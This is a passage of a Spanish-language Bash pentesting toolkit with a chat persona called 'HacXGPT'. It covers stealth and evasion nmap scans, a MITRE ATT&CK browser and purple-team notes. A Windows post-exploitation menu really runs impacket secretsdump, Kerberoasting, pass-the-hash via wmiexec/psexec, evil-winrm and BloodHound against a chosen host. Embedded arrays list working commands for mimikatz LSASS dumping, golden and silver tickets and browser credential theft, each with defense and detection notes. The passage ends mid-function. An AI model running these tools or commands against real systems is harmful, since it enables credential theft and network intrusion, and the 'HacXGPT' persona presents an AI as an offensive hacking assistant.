        echo -e "${YELLOW}⚠️  ADVERTENCIA LEGAL: Información provista estrictamente con fines educativos y de auditoría autorizada.${NC}"
        _show_chat_topic "lolbins" "Living Off The Land Binaries (T1218)"
    }

    _chat_pth() {
        echo -e "${YELLOW}⚠️  ADVERTENCIA LEGAL: Información provista estrictamente con fines educativos y de auditoría autorizada.${NC}"
        _show_chat_topic "pth" "Pass-the-Hash (T1550.002)"
    }

    _chat_apt29() {
        _show_chat_topic "apt29" "APT29 / Cozy Bear (SVR Rusia)"
    }

    _chat_apt38() {
        _show_chat_topic "apt38" "APT38 / Lazarus Group (RPDC)"
    }

    _chat_fin7() {
        _show_chat_topic "fin7" "FIN7 / Carbanak (Crimen Organizado)"
    }

    _chat_trivia() {
        _show_chat_topic "trivia" "¿Sabías que? — Threat Intelligence 2024-2025"
    }

    _chat_mitre_t1003() {
        _show_purple_technique "T1003"
    }
    _chat_mitre_t1566() {
        _show_purple_technique "T1566"
    }
    _chat_mitre_t1059() {
        _show_purple_technique "T1059"
    }
    _chat_mitre_t1055() {
        _show_purple_technique "T1055"
    }

    while true; do
        show_banner
        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║          ${GREEN}💬 CHAT LIBRE TÉCNICO${CYAN}              ║${NC}"
        echo -e "${CYAN}║   ${YELLOW}Hacking · MITRE ATT&CK · CVEs · APTs${CYAN}    ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
        echo ""

        echo -e "${GREEN}📚 TEMAS DISPONIBLES:${NC}"
        echo -e "${BLUE}• botnet, ddos, sql, xss, phishing, hash${NC}"
        echo -e "${PURPLE}• cve${NC}          - Top CVEs 2024-2025 con CVSS"
        echo -e "${PURPLE}• kerberoasting${NC} - T1558.003 detallado"
        echo -e "${PURPLE}• lolbins${NC}       - Living Off The Land Binaries"
        echo -e "${PURPLE}• pass the hash${NC} - T1550.002 con comandos"
        echo -e "${RED}• apt29, apt38, fin7${NC} - Perfiles de APT"
        echo -e "${YELLOW}• sabias que${NC}    - Dato de inteligencia de amenazas"
        echo -e "${CYAN}• t1003, t1566, t1059, t1055${NC} - Purple Team por ID"
        echo ""
        echo -e "${RED}📝 Escribe 'salir' para volver al menú${NC}"
        echo ""

        read -p "❓ Tu pregunta: " pregunta

        pregunta_lower=$(echo "$pregunta" | tr '[:upper:]' '[:lower:]')

        # Extraer dominio/IP de la pregunta
        local extracted_domain=""
        if [[ "$pregunta_lower" =~ ([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|[a-z0-9.-]+\.[a-z]{2,}) ]]; then
            extracted_domain="${BASH_REMATCH[1]}"
        fi
        
        # Determinar CHAT_TARGET
        unset CHAT_TARGET
        if [[ -n "$extracted_domain" ]]; then
            export CHAT_TARGET="$extracted_domain"
            echo -e "  ${GREEN}✅ Objetivo temporal detectado para el chat: ${CYAN}$CHAT_TARGET${NC}"
            sleep 1
        elif [[ -n "$TARGET" ]]; then
            export CHAT_TARGET="$TARGET"
        else
            echo ""
            read -p "🎯 (Opcional) No se detectó objetivo. Ingresa IP/Dominio para contexto: " CHAT_TARGET
            [[ -z "$CHAT_TARGET" ]] && export CHAT_TARGET="[OBJETIVO]"
        fi

        if [[ "$pregunta_lower" == "salir" ]]; then
            echo ""
            echo "Regresando al menú principal..."
            sleep 1
            return
        fi

        echo ""
        echo "🤖 HacXGPT:"
        echo "══════════════════════════════════════════════"

        # Buscar coincidencia en el array asociativo
        matched_fn=""
        for keyword in "${!chat_dispatch[@]}"; do
            if [[ "$pregunta_lower" == *"$keyword"* ]]; then
                matched_fn="${chat_dispatch[$keyword]}"
                break
            fi
        done

        if [[ -n "$matched_fn" ]]; then
            output=$("$matched_fn")
            echo "$output"
            save_output "[$pregunta] $output"
        else
            _chat_with_ollama "$pregunta"
        fi

        echo "══════════════════════════════════════════════"
        echo ""
        read -p "💬 Otra pregunta? (Enter para salir): " continuar
        if [[ -z "$continuar" ]]; then
            return
        fi
    done
}

# ============================================
# Ejecuta nmap sigiloso con sudo y muestra resultados
_run_stealth_nmap() {
  local label="$1"
  local objetivo="$2"
  shift 2

  if ! check_command nmap; then
      echo -e "${YELLOW}💡 Para instalar nmap:${NC} sudo apt install nmap"
      return 1
  fi

  local cmd_display="sudo nmap $* $objetivo"
  echo ""
  echo -e "${YELLOW}▶ Ejecutando: ${cmd_display}${NC}"
  echo ""
  local output
  output=$(sudo nmap "$@" "$objetivo" 2>&1)
  echo "$output"
  save_output "[${label} ${objetivo}]\n${output}"
  type track_technique &>/dev/null && track_technique "T1046" "Network Service Scanning ($label)"
}

# 8. ESCANEO SIGILOSO (IMPLEMENTADO)
# ============================================
escaneo_sigiloso() {
    while true; do
        show_banner
        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║          ${GREEN}🔍 ESCANEO SIGILOSO${CYAN}                ║${NC}"
        echo -e "${CYAN}║      ${YELLOW}Técnicas avanzadas de escaneo${CYAN}        ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
        echo ""
        
        echo -e "${GREEN}🎯 TÉCNICAS DE ESCANEO SIGILOSO:${NC}"
        echo ""
        echo "1. Escaneo TCP SYN (Stealth)"
        echo "2. Escaneo XMAS Tree"
        echo "3. Escaneo FIN"
        echo "4. Escaneo NULL"
        echo "5. Escaneo UDP"
        echo "6. Técnicas de evasión"
        echo "7. Volver al menú principal"
        echo ""
        
        read -p "🎯 Selecciona opción [1-7]: " opcion
        
        case $opcion in
            1)
                read -p "🎯 Objetivo para SYN Stealth: " objetivo
                if [ -n "$objetivo" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 ESCANEO TCP SYN STEALTH:${NC}"
                    echo ""
                    echo "• Comando básico: nmap -sS $objetivo"
                    echo "• Con timing lento: nmap -sS -T2 $objetivo"
                    echo "• Puertos específicos: nmap -sS -p 80,443,22 $objetivo"
                    echo "• Sin ping: nmap -sS -Pn $objetivo"
                    echo ""
                    echo "📊 EXPLICACIÓN:"
                    echo "Envía paquetes SYN y analiza respuestas SYN-ACK"
                    echo "No completa el handshake TCP (más sigiloso)"
                    _run_stealth_nmap "SYN STEALTH" "$objetivo" -sS -T2 -Pn
                fi
                ;;
            2)
                read -p "🎯 Objetivo para XMAS Tree: " objetivo
                if [ -n "$objetivo" ]; then
                    echo ""
                    echo -e "${YELLOW}🎄 ESCANEO XMAS TREE:${NC}"
                    echo ""
                    echo "• Comando: nmap -sX $objetivo"
                    echo "• Con opciones: nmap -sX -T2 $objetivo"
                    echo ""
                    echo "📊 EXPLICACIÓN:"
                    echo "Envía paquetes con flags FIN, URG y PUSH activados"
                    echo "Como un árbol de Navidad (XMAS)"
                    _run_stealth_nmap "XMAS TREE" "$objetivo" -sX -T2 -Pn
                fi
                ;;
            3)
                read -p "🎯 Objetivo para FIN Scan: " objetivo
                if [ -n "$objetivo" ]; then
                    echo ""
                    echo -e "${YELLOW}🏁 ESCANEO FIN:${NC}"
                    echo ""
                    echo "• Comando: nmap -sF $objetivo"
                    echo "• Variante: nmap -sF -f $objetivo (fragmentado)"
                    echo ""
                    echo "📊 EXPLICACIÓN:"
                    echo "Envía paquetes solo con flag FIN activado"
                    echo "Útil para evadir firewalls simples"
                    _run_stealth_nmap "FIN SCAN" "$objetivo" -sF -T2 -Pn
                fi
                ;;
            4)
                read -p "🎯 Objetivo para NULL Scan: " objetivo
                if [ -n "$objetivo" ]; then
                    echo ""
                    echo -e "${YELLOW}🚫 ESCANEO NULL:${NC}"
                    echo ""
                    echo "• Comando: nmap -sN $objetivo"
                    echo ""
                    echo "📊 EXPLICACIÓN:"
                    echo "Envía paquetes sin ningún flag activado"
                    echo "Completamente 'null'"
                    _run_stealth_nmap "NULL SCAN" "$objetivo" -sN -T2 -Pn
                fi
                ;;
            5)
                read -p "🎯 Objetivo para UDP Scan: " objetivo
                if [ -n "$objetivo" ]; then
                    echo ""
                    echo -e "${YELLOW}📨 ESCANEO UDP:${NC}"
                    echo ""
                    echo "• Comando: nmap -sU $objetivo"
                    echo "• Puertos comunes: nmap -sU -F $objetivo"
                    echo "• Todos los puertos: nmap -sU -p- $objetivo (MUY LENTO)"
                    echo ""
                    echo "⚠️ ADVERTENCIA:"
                    echo "Los escaneos UDP son muy lentos"
                    echo "Puede tomar horas para todos los puertos"
                    _run_stealth_nmap "UDP SCAN" "$objetivo" -sU -F -T2 -Pn
                fi
                ;;
            6)
                echo ""
                echo -e "${YELLOW}🎭 TÉCNICAS DE EVASIÓN:${NC}"
                echo ""
                echo "• Fragmentación: nmap -f"
                echo "• MTU personalizado: nmap --mtu 16"
                echo "• Decoys: nmap -D RND:10"
                echo "• Spoofing: nmap -S [IP_FALSA]"
                echo "• Source port: nmap --source-port 53"
                echo "• Timing aleatorio: nmap --scan-delay 5s"
                echo "• Data length: nmap --data-length 50"
                ;;
            7)
                return
                ;;
            *)
                echo -e "${RED}❌ Opción no válida${NC}"
                ;;
        esac
        
        echo ""
        read -p "↵ Presiona Enter para continuar..." dummy
    done
}

# ============================================================
# 9. MATRIZ MITRE ATT&CK — NAVEGADOR COMPLETO
# ============================================================
mitre_menu() {
    preguntar_objetivo || return
    while true; do
        show_banner
        echo -e "${CYAN}╔══════════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║        ${GREEN}🎯 MATRIZ MITRE ATT&CK v14${CYAN}              ║${NC}"
        echo -e "${CYAN}║      ${YELLOW}Enterprise Matrix — 14 Tácticas${CYAN}           ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${GREEN}TÁCTICAS ENTERPRISE:${NC}"
        echo ""
        local idx=1
        for tid in "${MITRE_ORDEN[@]}"; do
            printf "  ${YELLOW}%2d.${NC} ${CYAN}[%s]${NC} %s\n" "$idx" "$tid" "${MITRE_TACTICAS[$tid]}"
            ((idx++))
        done
        echo -e "  ${RED} 0. Volver al menú principal${NC}"
        echo ""
        read -p "🎯 Selecciona táctica [0-14]: " sel
        [[ "$sel" == "0" ]] && return
        if [[ "$sel" =~ ^[0-9]+$ ]] && (( sel >= 1 && sel <= 14 )); then
            local tactica_id="${MITRE_ORDEN[$((sel-1))]}"
            local tactica_nombre="${MITRE_TACTICAS[$tactica_id]}"
            # Mostrar técnicas de esa táctica
            while true; do
                show_banner
                echo -e "${PURPLE}╔══════════════════════════════════════════════════╗${NC}"
                echo -e "${PURPLE}║  ${CYAN}[$tactica_id]${NC} ${GREEN}${tactica_nombre}${NC}"
                echo -e "${PURPLE}╚══════════════════════════════════════════════════╝${NC}"
                echo ""
                echo -e "${YELLOW}TÉCNICAS CLAVE:${NC}"
                echo ""
                local tecnicas_str="${MITRE_TECNICAS[$tactica_id]}"
                IFS='|' read -ra tecnicas <<< "$tecnicas_str"
                local tidx=1
                for tec in "${tecnicas[@]}"; do
                    local tid_t="${tec%%:*}"
                    local tname="${tec##*:}"
                    printf "  ${YELLOW}%d.${NC} ${CYAN}%-12s${NC} %s\n" "$tidx" "$tid_t" "$tname"
                    ((tidx++))
                done
                echo ""
                echo -e "  ${BLUE}L. Ver en modo Purple Team (Ataque+Defensa)${NC}"
                echo -e "  ${RED}0. Volver${NC}"
                echo ""
                read -p "🔍 Selecciona técnica o [L/0]: " tsel
                [[ "$tsel" == "0" ]] && break
                if [[ "${tsel,,}" == "l" ]]; then
                    # Mostrar purple team de la primera técnica
                    local first_id="${tecnicas[0]%%:*}"
                    _show_purple_technique "$first_id"
                elif [[ "$tsel" =~ ^[0-9]+$ ]] && (( tsel >= 1 && tsel < tidx )); then
                    local sel_tec="${tecnicas[$((tsel-1))]}"
                    local sel_id="${sel_tec%%:*}"
                    _show_mitre_technique "$sel_id"
                fi
                echo ""
                read -p "↵ Presiona Enter para continuar..." _
            done
        fi
    done
}

# Helper: muestra técnica básica MITRE con su descripción y ataque
_show_mitre_technique() {
    local tech_id="${1^^}"
    local pdata="${PURPLE_DATA[$tech_id]}"
    
    echo -e "${PURPLE}╔══════════════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║  MITRE ATT&CK — ${CYAN}$tech_id${NC}"
    echo -e "${PURPLE}╚══════════════════════════════════════════════════╝${NC}"
    echo -e "📊 Probando contra: ${CYAN}${TARGET}${NC}"
    echo ""
    
    # Reemplazar TARGET
    pdata="${pdata//TARGET/$TARGET}"
    
    # Separar por ||| y mostrar
    local temp="$pdata"
    local delimiter="|||"
    local secciones=()
    while [[ "$temp" == *"$delimiter"* ]]; do
        secciones+=("${temp%%"$delimiter"*}")
        temp="${temp#*"$delimiter"}"
    done
    secciones+=("$temp")
    
    for seccion in "${secciones[@]}"; do
        seccion="$(echo -e "$seccion" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
        [[ -z "$seccion" ]] && continue
        
        if [[ "$seccion" == *"🔴"* ]]; then
            echo -e "${RED}$seccion${NC}"
        elif [[ "$seccion" == *"🔵"* ]]; then
            echo -e "${BLUE}$seccion${NC}"
        elif [[ "$seccion" == *"🟣"* ]]; then
            echo -e "${PURPLE}$seccion${NC}"
        elif [[ "$seccion" == *"📝"* ]]; then
            echo -e "${YELLOW}$seccion${NC}"
        else
            echo -e "$seccion"
        fi
        echo ""
    done
}

# Helper: muestra vista Purple Team de una técnica por ID
_show_purple_technique() {
    local tech_id="${1^^}"
    local pdata="${PURPLE_DATA[$tech_id]}"
    
    echo -e "${PURPLE}╔══════════════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║  PURPLE TEAM — ${CYAN}$tech_id${NC}"
    echo -e "${PURPLE}╚══════════════════════════════════════════════════╝${NC}"
    
    if [[ -z "$pdata" ]]; then
        echo -e "${YELLOW}ℹ️  No hay datos Purple Team detallados para $tech_id.${NC}"
        echo -e "    Consulta: https://attack.mitre.org/techniques/$tech_id"
        return
    fi
    
    echo -e "📊 Probando contra: ${CYAN}${TARGET}${NC}"
    
    # Reemplazar TARGET
    pdata="${pdata//TARGET/$TARGET}"
    
    local temp="$pdata"
    local delimiter="|||"
    local secciones=()
    while [[ "$temp" == *"$delimiter"* ]]; do
        secciones+=("${temp%%"$delimiter"*}")
        temp="${temp#*"$delimiter"}"
    done
    secciones+=("$temp")
    
    for seccion in "${secciones[@]}"; do
        seccion="$(echo -e "$seccion" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
        [[ -z "$seccion" ]] && continue
        
        if [[ "$seccion" == *"🔴"* ]]; then
            echo -e "${RED}$seccion${NC}"
        elif [[ "$seccion" == *"🔵"* ]]; then
            echo -e "${BLUE}$seccion${NC}"
        elif [[ "$seccion" == *"🟣"* ]]; then
            echo -e "${PURPLE}$seccion${NC}"
        else
            echo -e "$seccion"
        fi
        echo ""
    done
}

# ============================================================
# 10. MODO PURPLE TEAM
# ============================================================
modo_purple_team() {
    while true; do
        show_banner
        echo -e "${PURPLE}╔══════════════════════════════════════════════════╗${NC}"
        echo -e "${PURPLE}║          ${RED}🔴 RED${NC} ${CYAN}+${NC} ${BLUE}🔵 BLUE${NC} ${CYAN}+${NC} ${PURPLE}🟣 PURPLE TEAM       ${PURPLE}║${NC}"
        echo -e "${PURPLE}║     ${YELLOW}Técnica por técnica: Ataque & Defensa${NC}     ${PURPLE}║${NC}"
        echo -e "${PURPLE}╚══════════════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${GREEN}TÉCNICAS PURPLE TEAM DISPONIBLES:${NC}"
        echo ""
        local teclist=(T1003 T1027 T1055 T1059 T1078 T1021 T1053 T1190 T1566 T1562)
        local tidx=1
        for t in "${teclist[@]}"; do
            # Obtener nombre de la primera línea del PURPLE_DATA
            local linea
            linea=$(echo "${PURPLE_DATA[$t]}" | grep -m1 "ATAQUE" | sed 's/🔴 ATAQUE — //' | sed 's/://')
            printf "  ${YELLOW}%2d.${NC} ${CYAN}%-8s${NC} %s\n" "$tidx" "$t" "$linea"
            ((tidx++))
        done
        echo ""
        echo -e "  ${BLUE}M. Buscar por ID de técnica (ej: T1003)${NC}"
        echo -e "  ${RED}0. Volver${NC}"
        echo ""
        read -p "🟣 Selecciona [1-${#teclist[@]}, M, 0]: " sel

        case "${sel,,}" in
            0) return ;;
            m)
                read -p "   Ingresa ID de técnica (ej: T1003): " tid_input
                if preguntar_objetivo; then
                    _show_purple_technique "${tid_input^^}"
                    read -p "↵ Enter para continuar..." _
                fi
                ;;
            *)
                if preguntar_objetivo; then
                    case $sel in
                        1) _show_purple_technique "T1003" ;;
                        2) _show_purple_technique "T1027" ;;
                        3) _show_purple_technique "T1055" ;;
                        4) _show_purple_technique "T1059" ;;
                        5) _show_purple_technique "T1078" ;;
                        6) _show_purple_technique "T1021" ;;
                        7) _show_purple_technique "T1053" ;;
                        8) _show_purple_technique "T1190" ;;
                        9) _show_purple_technique "T1566" ;;
                        10) _show_purple_technique "T1562" ;;
                    esac
                    read -p "↵ Enter para continuar..." _
                fi
                ;;
        esac
    done
}

# ============================================================
# 11. POST-EXPLOTACIÓN (Windows + Linux + Evasión)
# ============================================================

declare -A WIN_DATA
WIN_DATA[1]="🔴 ATAQUE:
  • mimikatz.exe privilege::debug sekurlsa::logonpasswords
  • procdump.exe -ma lsass.exe lsass.dmp && pypykatz lsa minidump lsass.dmp
  • python3 secretsdump.py DOMAIN/user:pass@TARGET
  • reg save HKLM\\SAM sam.hive && reg save HKLM\\SYSTEM sys.hive
  • comsvcs.dll: rundll32.exe comsvcs.dll MiniDump \$(PID) lsass.dmp full
|||
🔵 DEFENSA:
  • Activar Windows Defender Credential Guard
  • Protected Users Security Group en Active Directory
  • Deshabilitar WDigest: UseLogonCredential = 0
  • gMSA/MSA en lugar de cuentas de servicio normales
|||
🟣 DETECCIÓN:
  • Event ID 4656/4663: acceso a handle de LSASS
  • Sysmon Event ID 10: ProcessAccess → lsass.exe
  • Alertar si procdump/comsvcs acceden a LSASS"

WIN_DATA[2]="🔴 ATAQUE:
  • SharpDPAPI.exe credentials /password:Passw0rd
  • python3 dpapi.py masterkey /in:key /password:pass
  • Get-ChildItem 'HKCU:\\Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2'
  • Dump Chrome: copy 'AppData\\Local\\Google\\Chrome\\Default\\Login Data' /tmp/
  • LaZagne.exe all → extrae credenciales de 30+ aplicaciones
|||
🔵 DEFENSA:
  • Gestores de contraseñas corporativos (CyberArk, BeyondTrust)
  • Monitorear acceso a archivos de credenciales del browser
  • Browser Enterprise Policies: bloquear exportación de contraseñas
|||
🟣 DETECCIÓN:
  • FileSystemAudit: acceso a Login Data / Cookies de Chrome/Firefox
  • Alertar en: dpapi, LaZagne, SharpDPAPI en EDR"

WIN_DATA[3]="🔴 ATAQUE:
  1. Enumerar SPNs:
     GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP
     setspn -T DOMAIN -Q */*
  
  2. Solicitar TGS tickets:
     Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt
     GetUserSPNs.py DOMAIN/user:pass -request
  
  3. Crackear offline:
     hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
     john --format=krb5tgs --wordlist=rockyou.txt hashes.txt
|||
🔵 DEFENSA:
  • Usar AES-256 en lugar de RC4 para cuentas de servicio (MSA/gMSA)
  • Contraseñas >25 chars en cuentas de servicio → 100 años crackear
  • Auditar cuentas con SPN: deben ser mínimas y monitoreadas
|||
🟣 DETECCIÓN:
  • Event ID 4769 (A): solicitud de TGS → muchas en poco tiempo = alerta
  • Filtrar: Ticket Encryption Type = 0x17 (RC4-HMAC → vulnerable)
  • SIEM: correlacionar 4769 masivo desde misma cuenta/IP"

WIN_DATA[4]="🔴 ATAQUE:
  • Robar ticket: Rubeus.exe dump /service:krbtgt
  • Importar ticket: Rubeus.exe ptt /ticket:ticket.kirbi
  • Golden Ticket: mimikatz kerberos::golden /user:admin /domain:DOM /sid:S-1-5 /krbtgt:HASH /ptt
  • Silver Ticket: mimikatz kerberos::golden /user:admin /target:server /service:cifs /rc4:HASH /ptt
  • Acceder recursos: dir \\\\target\\C$
|||
🔵 DEFENSA:
  • Cambiar contraseña de KRBTGT 2 veces (invalida todos los Golden Tickets)
  • Privileged Access Workstations (PAW) — aísla credenciales admin
  • Monitorear cuentas con atributos anómalos (SID history, etc.)
|||
🟣 DETECCIÓN:
  • Event ID 4768: TGT request con atributos anómalos
  • Event ID 4769: TGS con cifrado 0x17 + cuenta sin SPN
  • Ticket con lifetime >10h o sin pasar por DC → Golden Ticket"

WIN_DATA[5]="🔴 ATAQUE:
  • systeminfo && whoami /all && net user && net localgroup administrators
  • Get-ComputerInfo | Select *OS*, *Domain*
  • wmic computersystem get model, manufacturer, systemtype
  • tasklist /V && netstat -ano && ipconfig /all
|||
🔵 DEFENSA:
  • JEA: limitar qué comandos puede ejecutar cada rol
  • Detectar reconocimiento excesivo en endpoint
|||
🟣 DETECCIÓN:
  • Sysmon ID 1: ejecución de systeminfo, whoami, net en cadena rápida
  • Correlacionar: 5+ comandos de discovery en <2 minutos → alerta"

WIN_DATA[6]="🔴 ATAQUE:
  • SharpHound.exe --CollectionMethods All --ZipFileName output.zip
  • bloodhound-python -u user -p pass -d DOMAIN.LOCAL -ns DC_IP -c all
  • PowerView: Get-DomainComputer -Properties *
  • net view /domain → listar máquinas en dominio
|||
🔵 DEFENSA:
  • Tier model: separar cuentas admin Tier 0/1/2
  • Monitorear cuentas que hacen bulk LDAP queries
|||
🟣 DETECCIÓN:
  • Event ID 4661: muchas consultas LDAP desde una cuenta en poco tiempo
  • NetFlow: consultas SMB masivas a muchos hosts = lateral discovery"

_show_post_exploitation() {
    local array_val="$1"
    local title="$2"
    
    echo -e "${RED}╔══ ${title} ════════════════════════════════╗${NC}"
    echo -e "📊 Probando contra: ${CYAN}${TARGET}${NC}"
    
    local pdata="${array_val//TARGET/$TARGET}"
    
    local temp="$pdata"
    local delimiter="|||"
    local secciones=()
    while [[ "$temp" == *"$delimiter"* ]]; do
        secciones+=("${temp%%"$delimiter"*}")
        temp="${temp#*"$delimiter"}"
    done
    secciones+=("$temp")
    
    for seccion in "${secciones[@]}"; do
        seccion="$(echo -e "$seccion" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
        [[ -z "$seccion" ]] && continue
        
        if [[ "$seccion" == *"🔴"* ]]; then
            echo -e "${RED}$seccion${NC}"
        elif [[ "$seccion" == *"🔵"* ]]; then
            echo -e "${BLUE}$seccion${NC}"
        elif [[ "$seccion" == *"🟣"* ]]; then
            echo -e "${PURPLE}$seccion${NC}"
        else
            echo -e "$seccion"
        fi
        echo ""
    done
}

_prompt_win_creds() {
    local default_target="${TARGET:-192.168.1.100}"
    read -p "🎯 IP / Host Windows objetivo [default: $default_target]: " win_host
    win_host="${win_host:-$default_target}"
    read -p "👤 Usuario Windows / Dominio [default: Administrator]: " win_user
    win_user="${win_user:-Administrator}"
    read -p "🔑 Contraseña o Hash NTLM (LM:NTLM): " win_pass
    WIN_TARGET_STR="${win_user}@${win_host}"
}

post_explotacion_windows() {
    while true; do
        show_banner
        echo -e "${RED}╔══════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}║       ${YELLOW}💣 POST-EXPLOTACIÓN — WINDOWS (REAL)${NC}       ${RED}║${NC}"
        echo -e "${RED}╚══════════════════════════════════════════════════╝${NC}"
        echo ""
        echo "1. T1003     — OS Credential Dumping (impacket-secretsdump / mimikatz)"
        echo "2. T1555     — Credentials from Password Stores (evil-winrm / DPAPI)"
        echo "3. T1558.003 — Kerberoasting (impacket-GetUserSPNs / Rubeus)"
        echo "4. T1550.003 — Pass-the-Ticket / Pass-the-Hash (impacket-wmiexec / psexec)"
        echo "5. T1082     — System Information Discovery (systeminfo / wmic / WinRM)"
        echo "6. T1018     — Remote System Discovery (bloodhound-python / Active Directory)"
        echo "7. Volver"
        echo ""
        read -p "💣 Selecciona [1-7]: " op
        case $op in
            1)
                _prompt_win_creds
                if confirm_risk "OS Credential Dumping ($WIN_TARGET_STR)" "ALTO" "$WIN_TARGET_STR"; then
                    local cmd_tool=""
                    if command -v impacket-secretsdump &>/dev/null; then
                        cmd_tool="impacket-secretsdump"
                    elif command -v secretsdump.py &>/dev/null; then
                        cmd_tool="secretsdump.py"
                    fi

                    if [ -n "$cmd_tool" ]; then
                        echo ""
                        echo -e "${YELLOW}🔍 Ejecutando $cmd_tool contra $WIN_TARGET_STR...${NC}"
                        local output
                        if [[ "$win_pass" == *":"* ]]; then
                            output=$($cmd_tool -hashes "$win_pass" "$WIN_TARGET_STR" 2>&1)
                        else
                            output=$($cmd_tool "${win_user}:${win_pass}@${win_host}" 2>&1)
                        fi
                        echo "$output"
                        save_output "[WIN POST-EXP T1003 $WIN_TARGET_STR]\n$output"
                        type track_technique &>/dev/null && track_technique "T1003" "OS Credential Dumping"
                    else
                        echo -e "${RED}❌ secretsdump no está disponible en PATH.${NC}"
                        echo -e "${YELLOW}💡 Instrucción de instalación:${NC} pip install impacket  (o sudo apt install python3-impacket)"
                        echo -e "${YELLOW}💡 Para Mimikatz binario:${NC} Descargar desde https://github.com/gentilkiwi/mimikatz/releases"
                    fi
                fi
                ;;
            2)
                _prompt_win_creds
                if confirm_risk "Credentials from Password Stores ($WIN_TARGET_STR)" "ALTO" "$WIN_TARGET_STR"; then
                    if check_command "evil-winrm" "gem install evil-winrm (o sudo apt install evil-winrm)"; then
                        echo ""
                        echo -e "${YELLOW}🔍 Conectando con evil-winrm a $WIN_TARGET_STR...${NC}"
                        local output
                        output=$(evil-winrm -i "$win_host" -u "$win_user" -p "$win_pass" -e "cmd /c dir %APPDATA%\\Microsoft\\Protect" 2>&1)
                        echo "$output"
                        save_output "[WIN POST-EXP T1555 $WIN_TARGET_STR]\n$output"
                        type track_technique &>/dev/null && track_technique "T1555" "Credentials from Password Stores"
                    fi
                fi
                ;;
            3)
                _prompt_win_creds
                if confirm_risk "Kerberoasting ($WIN_TARGET_STR)" "ALTO" "$WIN_TARGET_STR"; then
                    local cmd_tool=""
                    if command -v impacket-GetUserSPNs &>/dev/null; then
                        cmd_tool="impacket-GetUserSPNs"
                    elif command -v GetUserSPNs.py &>/dev/null; then
                        cmd_tool="GetUserSPNs.py"
                    fi

                    if [ -n "$cmd_tool" ]; then
                        read -p "🏰 Nombre del Dominio AD (ej: contoso.local): " domain_name
                        domain_name="${domain_name:-domain.local}"
                        echo ""
                        echo -e "${YELLOW}🔍 Extrayendo SPNs y Tickets TGS desde $domain_name...${NC}"
                        local output
                        output=$($cmd_tool "${domain_name}/${win_user}:${win_pass}@${win_host}" -request 2>&1)
                        echo "$output"
                        save_output "[WIN POST-EXP T1558.003 $WIN_TARGET_STR]\n$output"
                        type track_technique &>/dev/null && track_technique "T1558.003" "Kerberoasting"
                    else
                        echo -e "${RED}❌ GetUserSPNs no está instalado.${NC}"
                        echo -e "${YELLOW}💡 Instrucción de instalación:${NC} pip install impacket"
                        echo -e "${YELLOW}💡 Para Rubeus.exe (C#):${NC} Descargar o compilar desde https://github.com/GhostPack/Rubeus"
                    fi
                fi
                ;;
            4)
                _prompt_win_creds
                if confirm_risk "Pass-the-Ticket / Pass-the-Hash ($WIN_TARGET_STR)" "ALTO" "$WIN_TARGET_STR"; then
                    local cmd_tool=""
                    if command -v impacket-wmiexec &>/dev/null; then
                        cmd_tool="impacket-wmiexec"
                    elif command -v wmiexec.py &>/dev/null; then
                        cmd_tool="wmiexec.py"
                    elif command -v impacket-psexec &>/dev/null; then
                        cmd_tool="impacket-psexec"
                    fi

                    if [ -n "$cmd_tool" ]; then
                        echo ""
                        echo -e "${YELLOW}🔍 Ejecutando $cmd_tool en $WIN_TARGET_STR...${NC}"
                        local output
                        if [[ "$win_pass" == *":"* ]]; then
                            output=$($cmd_tool -hashes "$win_pass" "${win_user}@${win_host}" "hostname && whoami" 2>&1)
                        else
                            output=$($cmd_tool "${win_user}:${win_pass}@${win_host}" "hostname && whoami" 2>&1)
                        fi
                        echo "$output"
                        save_output "[WIN POST-EXP T1550.003 $WIN_TARGET_STR]\n$output"
                        type track_technique &>/dev/null && track_technique "T1550.003" "Pass-the-Ticket / Pass-the-Hash"
                    else
                        echo -e "${RED}❌ impacket-wmiexec / psexec no está disponible.${NC}"
                        echo -e "${YELLOW}💡 Instrucción de instalación:${NC} pip install impacket  (o sudo apt install python3-impacket)"
                    fi
                fi
                ;;
            5)
                _prompt_win_creds
                if confirm_risk "System Information Discovery ($WIN_TARGET_STR)" "ALTO" "$WIN_TARGET_STR"; then
                    local cmd_tool=""
                    if command -v impacket-wmiexec &>/dev/null; then
                        cmd_tool="impacket-wmiexec"
                    elif command -v wmiexec.py &>/dev/null; then
                        cmd_tool="wmiexec.py"
                    fi

                    if [ -n "$cmd_tool" ]; then
                        echo ""
                        echo -e "${YELLOW}🔍 Obteniendo información del sistema en $WIN_TARGET_STR...${NC}"
                        local output
                        output=$($cmd_tool "${win_user}:${win_pass}@${win_host}" "systeminfo & wmic os get Caption,OSArchitecture,Version" 2>&1)
                        echo "$output"
                        save_output "[WIN POST-EXP T1082 $WIN_TARGET_STR]\n$output"
                        type track_technique &>/dev/null && track_technique "T1082" "System Information Discovery"
                    else
                        echo -e "${RED}❌ impacket-wmiexec no está instalado.${NC}"
                        echo -e "${YELLOW}💡 Instrucción de instalación:${NC} pip install impacket"
                    fi
                fi
                ;;
            6)
                _prompt_win_creds
                if confirm_risk "Remote System Discovery - BloodHound ($WIN_TARGET_STR)" "ALTO" "$WIN_TARGET_STR"; then
                    if check_command "bloodhound-python" "pip install bloodhound (o sudo apt install bloodhound)"; then
                        read -p "🏰 Nombre del Dominio AD: " domain_name
                        domain_name="${domain_name:-domain.local}"
                        echo ""
